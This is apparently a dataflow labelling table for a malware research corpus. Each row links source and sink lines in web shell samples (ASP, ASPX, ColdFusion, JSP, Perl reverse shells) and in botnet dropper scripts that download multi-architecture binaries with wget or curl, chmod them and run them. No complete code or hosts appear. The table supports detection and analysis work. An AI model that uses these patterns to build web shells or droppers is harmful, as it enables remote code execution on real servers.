+/mnt/games/normtest/s3/asp/007_Manisso.asp	841	input-request	846	file-write	must	mptpath=Request.Form(path) -> objFSO.CopyFolder mptpath; file large
+/mnt/games/normtest/s3/asp/007_Manisso.asp	841	input-request	849	file-rename	must	mptpath=Request.Form(path) -> objFSO.MoveFolder mptpath; file large
+/mnt/games/normtest/s3/asp/007_Manisso.asp	871	input-request	876	file-write	must	mptpath=Request.Form(path) -> objFSO.CopyFile mptpath; file large
+/mnt/games/normtest/s3/asp/007_Manisso.asp	871	input-request	879	file-rename	must	mptpath=Request.Form(path) -> objFSO.MoveFile mptpath; file large
+/mnt/games/normtest/s3/asp/007_Manisso.asp	910	input-request	910	file-open	must	OpenTextFile(Trim(Request.QueryString(path)),1) nested; file large
+/mnt/games/normtest/s3/asp/016_pouya.asp	524	input-request	527	proc-start	must	szCMD=Request.QueryString(.CMD) into oScript.Run; file large
+/mnt/games/normtest/s3/asp/016_pouya.asp	481	input-request	483	file-delete	must	caminho=Request.QueryString(path) -> ObjFSO.DeleteFolder caminho; file large
+/mnt/games/normtest/s3/asp/016_pouya.asp	663	input-request	665	file-open	must	file=Request.QueryString(file) -> fso.OpenTextFile(file) txtview; file large
+/mnt/games/normtest/s3/asp/016_pouya.asp	674	input-request	676	file-open	must	file=Request.QueryString(file) -> fso.OpenTextFile(file) txtedit; file large
+/mnt/games/normtest/s3/asp/016_pouya.asp	689	input-request	689	file-open	must	OpenTextFile(Replace(Trim(Request.Form(path)))) nested; file large
+/mnt/games/normtest/s3/asp/016_pouya.asp	700	input-request	701	file-write	may	caminho=showobjpath(Request.Form(path)) & name (file function) -> CreateTextFile(caminho); file large
+/mnt/games/normtest/s3/asp/016_pouya.asp	726	input-request	742	file-open	must	strFileName=Request.QueryString(file) -> Stream.LoadFromFile strFileName; file large
+/mnt/games/normtest/s3/asp/016_pouya.asp	586	input-request	586	reg-set	must	WshShell.RegWrite(Trim(Request.QueryString(key)),...) nested; file large
+/mnt/games/normtest/s3/asp/016_pouya.asp	761	input-request	102	file-write	may	File.SaveToDisk Request.QueryString(path) -> sub SaveToDisk(sPath) -> oFS.CreateTextFile(sPath & FileName); file large
+/mnt/games/normtest/s3/asp/016_pouya.asp	912	input-request	917	file-write	must	mptpath=Request.Form(path) -> objFSO.CopyFolder mptpath; file large
+/mnt/games/normtest/s3/asp/016_pouya.asp	912	input-request	920	file-rename	must	mptpath=Request.Form(path) -> objFSO.MoveFolder mptpath; file large
+/mnt/games/normtest/s3/asp/016_pouya.asp	942	input-request	947	file-write	must	mptpath=Request.Form(path) -> objFSO.CopyFile mptpath; file large
+/mnt/games/normtest/s3/asp/016_pouya.asp	942	input-request	950	file-rename	must	mptpath=Request.Form(path) -> objFSO.MoveFile mptpath; file large
+/mnt/games/normtest/s3/asp/016_pouya.asp	981	input-request	981	file-open	must	OpenTextFile(Trim(Request.QueryString(path)),1) nested; file large
+/mnt/games/normtest/s3/aspx/009_aspx_bypass_av.aspx	27	input-request	17	proc-start	may	txtArg.Text l27 -> myexec(arg) l10 -> mypsi.Arguments l14 -> Process.Start(mypsi) l17
+/mnt/games/normtest/s3/aspx/019_cmdasp.aspx	24	input-request	15	proc-start	may	txtArg.Text l24 -> ExcuteCmd(arg) l8 -> psi.Arguments l12 -> Process.Start(psi) l15
+/mnt/games/normtest/s3/aspx/020_shell.aspx	83	input-request	83	proc-start	must	new ProcessStartInfo(cmd, /c + Request.Form[c]) l83
+/mnt/games/normtest/s3/aspx/020_shell.aspx	83	input-request	94	proc-start	may	Request.Form[c] l83 -> procStartInfo -> p.StartInfo l93 (object field) -> p.Start() l94
+/mnt/games/normtest/s3/cfm/006_cfexec.cfm	29	input-request	29	proc-start	must	cfexecute name=#Form.cmd# l29
+/mnt/games/normtest/s3/cfm/006_cfexec.cfm	30	input-request	29	proc-start	must	cfexecute arguments=#Form.opts# l30 (same tag, l29)
+/mnt/games/normtest/s3/cfm/090_shell.cfm	82	input-request	85	proc-start	must	argumentsArray=listToArray(form.arguments) l82 -> cfexecute arguments l85
+/mnt/games/normtest/s3/cfm/090_shell.cfm	85	input-request	85	proc-start	must	cfexecute name=Replace(preservesinglequotes(form.cmd)) nested l85
+/mnt/games/normtest/s3/jsp/021_cmdjsp.jsp	10	input-request	16	proc-start	must	cmd=request.getParameter(cmd) l10 -> Runtime.getRuntime().exec(cmd.exe /C + cmd) l16
+/mnt/games/normtest/s3/jsp/022_jsp-reverse.jsp	63	input-request	71	net-connect	must	ipAddress=request.getParameter(ipaddress) l63 -> new Socket(ipAddress,...) l71
+/mnt/games/normtest/s3/jsp/022_jsp-reverse.jsp	64	input-request	71	net-connect	must	ipPort=request.getParameter(port) l64 -> new Socket(...,Integer(ipPort)) l71
+/mnt/games/normtest/s3/jsp/101_cmd.jsp	65	input-request	65	proc-start	must	Runtime.getRuntime().exec(request.getParameter(cmd)) nested l65
+/mnt/games/normtest/s3/cgi/024_perlcmd.cgi	8	input-request	25	proc-start	must	req=$ENV{QUERY_STRING} l8 -> chomp/s/// -> backtick `$req` l25 (readpipe)
+/mnt/games/normtest/s3/pl/023_perl-reverse-shell.pl	90	net-addr	90	net-connect	must	connect(SOCK, sockaddr_in($port,inet_aton($ip))) nested l90
+/mnt/games/normtest/s3/pl/023_perl-reverse-shell.pl	89	net-open	90	net-connect	must	socket(SOCK,...) l89 makes handle SOCK used by connect(SOCK,...) l90
+/mnt/games/normtest/s3/py/091_shell.py	57	http-fetch	67	data-decode	may	resp=urlopen(url,data) l57 (or l59) -> html=resp.read() l61 -> re.findall -> m -> base64.b64decode(m) l67; resp set in two branches
+/mnt/games/normtest/s3/py/091_shell.py	59	http-fetch	67	data-decode	may	resp=urlopen(url) l59 -> html=resp.read() l61 -> re.findall -> base64.b64decode(m) l67
+/mnt/games/normtest/s3/asp/073_cmd-asp-5.1.asp	13	input-request	18	proc-start	must	szCMD=Request.Form(C) l13 into oS.Run l18
+/mnt/games/normtest/s3/asp/074_cmdasp.asp	23	input-request	28	proc-start	must	szCMD=Request.Form(.CMD) l23 into oScript.Run l28
+/mnt/games/normtest/s3/asp/085_dns.asp	128	input-request	136	proc-start	must	query=Request.Form(query) l128 -> command l134 -> objWShell.Exec l136
+/mnt/games/normtest/s3/asp/085_dns.asp	93	input-request	136	proc-start	may	qtype=Request.Form(type) l93, reassigned l103 in a branch, -> command l134 -> Exec l136
+/mnt/games/normtest/s3/asp/086_file.asp	84	input-request	98	file-open	may	filepath=Request.QueryString(file) l84 -> fso.GetFile l90 -> file.Path (object member) -> stream.LoadFromFile l98
+/mnt/games/normtest/s3/asp/087_proxy.asp	146	input-request	367	http-connect	may	url=Request.QueryString(laudurl) l146 in sub ParseUrl -> url* globals -> FullUrl l231 -> http.Open l367
+/mnt/games/normtest/s3/asp/087_proxy.asp	136	input-request	375	http-send	may	CleanFormValues r.Replace(request.form) l136 -> params l371 -> http.Send l375; http made by two ProgIDs l358/l360
+/mnt/games/normtest/s3/asp/088_shell.asp	55	input-request	58	proc-start	must	cmd=Request.Form(cmd) l55 -> wShell.Exec(cmd) l58
+/mnt/games/normtest/s3/aspx/075_cmdasp.aspx	24	input-request	15	proc-start	may	txtArg.Text l24 -> ExcuteCmd(arg) l8 -> psi.Arguments l12 -> Process.Start(psi) l15
+/mnt/games/normtest/s3/aspx/089_shell.aspx	83	input-request	83	proc-start	must	new ProcessStartInfo(cmd, /c + Request.Form[c]) l83
+/mnt/games/normtest/s3/aspx/089_shell.aspx	83	input-request	94	proc-start	may	Request.Form[c] l83 -> procStartInfo -> p.StartInfo l93 (object field) -> p.Start() l94
+/mnt/games/normtest/s3/cfm/076_cfexec.cfm	29	input-request	29	proc-start	must	cfexecute name=#Form.cmd# l29
+/mnt/games/normtest/s3/cfm/076_cfexec.cfm	30	input-request	29	proc-start	must	cfexecute arguments=#Form.opts# l30 (same tag, l29)
+/mnt/games/normtest/s3/jsp/077_cmdjsp.jsp	10	input-request	16	proc-start	must	cmd=request.getParameter(cmd) l10 -> Runtime.getRuntime().exec(cmd.exe /C + cmd) l16
+/mnt/games/normtest/s3/jsp/078_jsp-reverse.jsp	63	input-request	71	net-connect	must	ipAddress=request.getParameter(ipaddress) l63 -> new Socket(ipAddress,...) l71
+/mnt/games/normtest/s3/jsp/078_jsp-reverse.jsp	64	input-request	71	net-connect	must	ipPort=request.getParameter(port) l64 -> new Socket(...,Integer(ipPort)) l71
+/mnt/games/normtest/s3/cgi/080_perlcmd.cgi	8	input-request	25	proc-start	must	req=$ENV{QUERY_STRING} l8 -> chomp/s/// -> backtick `$req` l25 (readpipe)
+/mnt/games/normtest/s3/pl/079_perl-reverse-shell.pl	90	net-addr	90	net-connect	must	connect(SOCK, sockaddr_in($port,inet_aton($ip))) nested l90
+/mnt/games/normtest/s3/pl/079_perl-reverse-shell.pl	89	net-open	90	net-connect	must	socket(SOCK,...) l89 makes handle SOCK used by connect(SOCK,...) l90
+/mnt/games/normtest/graph_research/work2/scripts/sh/063_build.sh	2	http-fetch	2	file-perm-set	shared	wget ... -O a (line 2, after the blank padding) then chmod 777 a: path "a"; corrected by a second reading, the first one cut the padded line
+/mnt/games/normtest/graph_research/work2/scripts/sh/063_build.sh	2	file-perm-set	2	proc-start	shared	chmod 777 a then sh a, line 2: path "a"
+/mnt/games/normtest/graph_research/work2/scripts/sh/085_hexbuild.sh	0	-	0	-	none	./convert is not a node; no relation
+/mnt/games/normtest/graph_research/work2/scripts/sh/049_sign-csr.sh	0	-	0	-	none	openssl nodes only; paths are variable expressions ($dir/$ca/$outbase.crt), no literal path or pipe between nodes
+/mnt/games/normtest/graph_research/work2/scripts/sh/036_transfer.sh	0	-	0	-	none	${SSH} dynamic command, pipe from dd (not a node); no relation
+/mnt/games/normtest/graph_research/work2/scripts/sh/019_proto-mismatch.sh	0	-	0	-	none	${SSHD} dynamic, echo not a node; no relation
+/mnt/games/normtest/graph_research/work2/scripts/sh/025_sftp-badcmds.sh	0	-	0	-	none	echo | ${SFTP}: echo is not a node, ${SFTP} dynamic; no relation
+/mnt/games/normtest/graph_research/work2/scripts/sh/094_rm_stale.sh	0	-	0	-	none	no table node; benign cleanup
+/mnt/games/normtest/graph_research/work2/scripts/sh/001_md5.sh	0	-	0	-	none	md5sum list, no node
+/mnt/games/normtest/graph_research/work2/scripts/sh/045_create-sub-ca.sh	0	-	0	-	none	openssl nodes only; paths are variable expressions, no literal path between nodes
+/mnt/games/normtest/graph_research/work2/scripts/sh/068_fixedbins.sh	1	http-fetch	1	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.x86 (line 1); chmod +x * is a glob
+/mnt/games/normtest/graph_research/work2/scripts/sh/068_fixedbins.sh	2	http-fetch	2	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.mips (line 2); chmod +x * is a glob
+/mnt/games/normtest/graph_research/work2/scripts/sh/068_fixedbins.sh	3	http-fetch	3	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.mpsl (line 3); chmod +x * is a glob
+/mnt/games/normtest/graph_research/work2/scripts/sh/068_fixedbins.sh	4	http-fetch	4	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.arm (line 4); chmod +x * is a glob
+/mnt/games/normtest/graph_research/work2/scripts/sh/068_fixedbins.sh	5	http-fetch	5	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.arm5 (line 5); chmod +x * is a glob
+/mnt/games/normtest/graph_research/work2/scripts/sh/068_fixedbins.sh	6	http-fetch	6	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.arm6 (line 6); chmod +x * is a glob
+/mnt/games/normtest/graph_research/work2/scripts/sh/068_fixedbins.sh	7	http-fetch	7	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.arm7 (line 7); chmod +x * is a glob
+/mnt/games/normtest/graph_research/work2/scripts/sh/068_fixedbins.sh	8	http-fetch	8	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.ppc (line 8); chmod +x * is a glob
+/mnt/games/normtest/graph_research/work2/scripts/sh/068_fixedbins.sh	9	http-fetch	9	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.m68k (line 9); chmod +x * is a glob
+/mnt/games/normtest/graph_research/work2/scripts/sh/068_fixedbins.sh	10	http-fetch	10	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.sh4 (line 10); chmod +x * is a glob
+/mnt/games/normtest/graph_research/work2/scripts/sh/068_fixedbins.sh	11	http-fetch	11	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.spc (line 11); chmod +x * is a glob
+/mnt/games/normtest/graph_research/work2/scripts/sh/068_fixedbins.sh	12	http-fetch	12	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.arc (line 12); chmod +x * is a glob
+/mnt/games/normtest/graph_research/work2/scripts/sh/068_fixedbins.sh	13	http-fetch	13	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.x86_64 (line 13); chmod +x * is a glob
+/mnt/games/normtest/graph_research/work2/scripts/sh/068_fixedbins.sh	14	http-fetch	14	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.i686 (line 14); chmod +x * is a glob
+/mnt/games/normtest/graph_research/work2/scripts/sh/068_fixedbins.sh	15	http-fetch	15	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.i486 (line 15); chmod +x * is a glob
+/mnt/games/normtest/graph_research/work2/scripts/sh/068_fixedbins.sh	16	http-fetch	16	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.mips64 (line 16); chmod +x * is a glob
+/mnt/games/normtest/wire_b/corp/smp/sh/0028_fixedbins.sh	1	http-fetch	1	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.x86 (line 1); chmod +x * is a glob
+/mnt/games/normtest/wire_b/corp/smp/sh/0028_fixedbins.sh	2	http-fetch	2	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.mips (line 2); chmod +x * is a glob
+/mnt/games/normtest/wire_b/corp/smp/sh/0028_fixedbins.sh	3	http-fetch	3	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.mpsl (line 3); chmod +x * is a glob
+/mnt/games/normtest/wire_b/corp/smp/sh/0028_fixedbins.sh	4	http-fetch	4	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.arm (line 4); chmod +x * is a glob
+/mnt/games/normtest/wire_b/corp/smp/sh/0028_fixedbins.sh	5	http-fetch	5	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.arm5 (line 5); chmod +x * is a glob
+/mnt/games/normtest/wire_b/corp/smp/sh/0028_fixedbins.sh	6	http-fetch	6	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.arm6 (line 6); chmod +x * is a glob
+/mnt/games/normtest/wire_b/corp/smp/sh/0028_fixedbins.sh	7	http-fetch	7	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.arm7 (line 7); chmod +x * is a glob
+/mnt/games/normtest/wire_b/corp/smp/sh/0028_fixedbins.sh	8	http-fetch	8	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.ppc (line 8); chmod +x * is a glob
+/mnt/games/normtest/wire_b/corp/smp/sh/0028_fixedbins.sh	9	http-fetch	9	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.m68k (line 9); chmod +x * is a glob
+/mnt/games/normtest/wire_b/corp/smp/sh/0028_fixedbins.sh	10	http-fetch	10	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.sh4 (line 10); chmod +x * is a glob
+/mnt/games/normtest/wire_b/corp/smp/sh/0028_fixedbins.sh	11	http-fetch	11	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.spc (line 11); chmod +x * is a glob
+/mnt/games/normtest/wire_b/corp/smp/sh/0028_fixedbins.sh	12	http-fetch	12	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.arc (line 12); chmod +x * is a glob
+/mnt/games/normtest/wire_b/corp/smp/sh/0028_fixedbins.sh	13	http-fetch	13	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.x86_64 (line 13); chmod +x * is a glob
+/mnt/games/normtest/wire_b/corp/smp/sh/0028_fixedbins.sh	14	http-fetch	14	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.i686 (line 14); chmod +x * is a glob
+/mnt/games/normtest/wire_b/corp/smp/sh/0028_fixedbins.sh	15	http-fetch	15	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.i486 (line 15); chmod +x * is a glob
+/mnt/games/normtest/wire_b/corp/smp/sh/0028_fixedbins.sh	16	http-fetch	16	http-fetch	shared	wget and curl -O fetch same URL, file name jKira.mips64 (line 16); chmod +x * is a glob
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	4	http-fetch	4	file-perm-set	shared	wget keeps last URL piece "i486" (line 4); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	4	http-fetch	4	file-perm-set	shared	curl -O keeps last URL piece "i486" (line 4); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	5	http-fetch	5	file-perm-set	shared	wget keeps last URL piece "68x64" (line 5); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	5	http-fetch	5	file-perm-set	shared	curl -O keeps last URL piece "68x64" (line 5); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	6	http-fetch	6	file-perm-set	shared	wget keeps last URL piece "i586" (line 6); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	6	http-fetch	6	file-perm-set	shared	curl -O keeps last URL piece "i586" (line 6); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	7	http-fetch	7	file-perm-set	shared	wget keeps last URL piece "686i" (line 7); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	7	http-fetch	7	file-perm-set	shared	curl -O keeps last URL piece "686i" (line 7); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	8	http-fetch	8	file-perm-set	shared	wget keeps last URL piece "pimps" (line 8); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	8	http-fetch	8	file-perm-set	shared	curl -O keeps last URL piece "pimps" (line 8); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	9	http-fetch	9	file-perm-set	shared	wget keeps last URL piece "pimpsle" (line 9); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	9	http-fetch	9	file-perm-set	shared	curl -O keeps last URL piece "pimpsle" (line 9); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	10	http-fetch	10	file-perm-set	shared	wget keeps last URL piece "mra" (line 10); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	10	http-fetch	10	file-perm-set	shared	curl -O keeps last URL piece "mra" (line 10); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	11	http-fetch	11	file-perm-set	shared	wget keeps last URL piece "mra5" (line 11); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	11	http-fetch	11	file-perm-set	shared	curl -O keeps last URL piece "mra5" (line 11); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	12	http-fetch	12	file-perm-set	shared	wget keeps last URL piece "mra6" (line 12); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	12	http-fetch	12	file-perm-set	shared	curl -O keeps last URL piece "mra6" (line 12); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	13	http-fetch	13	file-perm-set	shared	wget keeps last URL piece "mra7" (line 13); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	13	http-fetch	13	file-perm-set	shared	curl -O keeps last URL piece "mra7" (line 13); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	14	http-fetch	14	file-perm-set	shared	wget keeps last URL piece "68x" (line 14); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	14	http-fetch	14	file-perm-set	shared	curl -O keeps last URL piece "68x" (line 14); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	15	http-fetch	15	file-perm-set	shared	wget keeps last URL piece "ppc" (line 15); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	15	http-fetch	15	file-perm-set	shared	curl -O keeps last URL piece "ppc" (line 15); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	16	http-fetch	16	file-perm-set	shared	wget keeps last URL piece "m68k" (line 16); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	16	http-fetch	16	file-perm-set	shared	curl -O keeps last URL piece "m68k" (line 16); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	17	http-fetch	17	file-perm-set	shared	wget keeps last URL piece "4sh" (line 17); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0005_x86.sh	17	http-fetch	17	file-perm-set	shared	curl -O keeps last URL piece "4sh" (line 17); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	2	http-fetch	2	file-perm-set	shared	wget keeps last URL piece "bips" (line 2); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	2	http-fetch	2	file-perm-set	shared	curl -O keeps last URL piece "bips" (line 2); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	3	http-fetch	3	file-perm-set	shared	wget keeps last URL piece "bpsl" (line 3); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	3	http-fetch	3	file-perm-set	shared	curl -O keeps last URL piece "bpsl" (line 3); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	4	http-fetch	4	file-perm-set	shared	wget keeps last URL piece "openssh" (line 4); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	4	http-fetch	4	file-perm-set	shared	curl -O keeps last URL piece "openssh" (line 4); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	5	http-fetch	5	file-perm-set	shared	wget keeps last URL piece "hacker6" (line 5); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	5	http-fetch	5	file-perm-set	shared	curl -O keeps last URL piece "hacker6" (line 5); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	6	http-fetch	6	file-perm-set	shared	wget keeps last URL piece "tftp" (line 6); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	6	http-fetch	6	file-perm-set	shared	curl -O keeps last URL piece "tftp" (line 6); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	7	http-fetch	7	file-perm-set	shared	wget keeps last URL piece "wget" (line 7); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	7	http-fetch	7	file-perm-set	shared	curl -O keeps last URL piece "wget" (line 7); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	8	http-fetch	8	file-perm-set	shared	wget keeps last URL piece "cron" (line 8); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	8	http-fetch	8	file-perm-set	shared	curl -O keeps last URL piece "cron" (line 8); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	9	http-fetch	9	file-perm-set	shared	wget keeps last URL piece "ftp" (line 9); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	9	http-fetch	9	file-perm-set	shared	curl -O keeps last URL piece "ftp" (line 9); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	10	http-fetch	10	file-perm-set	shared	wget keeps last URL piece "pftp" (line 10); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	10	http-fetch	10	file-perm-set	shared	curl -O keeps last URL piece "pftp" (line 10); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	11	http-fetch	11	file-perm-set	shared	wget keeps last URL piece "sh" (line 11); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	11	http-fetch	11	file-perm-set	shared	curl -O keeps last URL piece "sh" (line 11); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	12	http-fetch	12	file-perm-set	shared	wget keeps last URL piece "armed" (line 12); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	12	http-fetch	12	file-perm-set	shared	curl -O keeps last URL piece "armed" (line 12); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	13	http-fetch	13	file-perm-set	shared	wget keeps last URL piece "apache2" (line 13); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	13	http-fetch	13	file-perm-set	shared	curl -O keeps last URL piece "apache2" (line 13); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	14	http-fetch	14	file-perm-set	shared	wget keeps last URL piece "telnetd" (line 14); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0006_bins.sh	14	http-fetch	14	file-perm-set	shared	curl -O keeps last URL piece "telnetd" (line 14); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0007_wget.sh	1	http-fetch	1	file-perm-set	shared	wget keeps last URL piece "arm" (line 1); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0007_wget.sh	2	http-fetch	2	file-perm-set	shared	wget keeps last URL piece "arm5" (line 2); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0007_wget.sh	3	http-fetch	3	file-perm-set	shared	wget keeps last URL piece "arm6" (line 3); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0007_wget.sh	4	http-fetch	4	file-perm-set	shared	wget keeps last URL piece "arm7" (line 4); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0007_wget.sh	5	http-fetch	5	file-perm-set	shared	wget keeps last URL piece "m68k" (line 5); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0007_wget.sh	6	http-fetch	6	file-perm-set	shared	wget keeps last URL piece "mips" (line 6); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0007_wget.sh	7	http-fetch	7	file-perm-set	shared	wget keeps last URL piece "mpsl" (line 7); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0007_wget.sh	8	http-fetch	8	file-perm-set	shared	wget keeps last URL piece "ppc" (line 8); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0007_wget.sh	9	http-fetch	9	file-perm-set	shared	wget keeps last URL piece "sh4" (line 9); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0007_wget.sh	10	http-fetch	10	file-perm-set	shared	wget keeps last URL piece "spc" (line 10); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0007_wget.sh	11	http-fetch	11	file-perm-set	shared	wget keeps last URL piece "x86" (line 11); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0007_wget.sh	12	http-fetch	12	file-perm-set	shared	wget keeps last URL piece "x86_64" (line 12); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0008_w.sh	1	http-fetch	1	file-perm-set	shared	wget keeps last URL piece "arm" (line 1); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0008_w.sh	2	http-fetch	2	file-perm-set	shared	wget keeps last URL piece "arm5" (line 2); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0008_w.sh	3	http-fetch	3	file-perm-set	shared	wget keeps last URL piece "arm6" (line 3); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0008_w.sh	4	http-fetch	4	file-perm-set	shared	wget keeps last URL piece "arm7" (line 4); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0008_w.sh	5	http-fetch	5	file-perm-set	shared	wget keeps last URL piece "m68k" (line 5); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0008_w.sh	6	http-fetch	6	file-perm-set	shared	wget keeps last URL piece "mips" (line 6); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0008_w.sh	7	http-fetch	7	file-perm-set	shared	wget keeps last URL piece "mpsl" (line 7); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0008_w.sh	8	http-fetch	8	file-perm-set	shared	wget keeps last URL piece "ppc" (line 8); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0008_w.sh	9	http-fetch	9	file-perm-set	shared	wget keeps last URL piece "sh4" (line 9); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0008_w.sh	10	http-fetch	10	file-perm-set	shared	wget keeps last URL piece "spc" (line 10); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0008_w.sh	11	http-fetch	11	file-perm-set	shared	wget keeps last URL piece "x86" (line 11); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0008_w.sh	12	http-fetch	12	file-perm-set	shared	wget keeps last URL piece "x86_64" (line 12); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	4	http-fetch	4	file-perm-set	shared	wget keeps last URL piece "i486" (line 4); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	4	http-fetch	4	file-perm-set	shared	curl -O keeps last URL piece "i486" (line 4); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	5	http-fetch	5	file-perm-set	shared	wget keeps last URL piece "68x64" (line 5); chmod names it
+/mnt/games/normtest/wire_b/corp/smp/sh/0011_dvr.sh	5	http-fetch	5	file-perm-set	shared	curl -O keeps last URL piece "68x64" (line 5); chmod names it
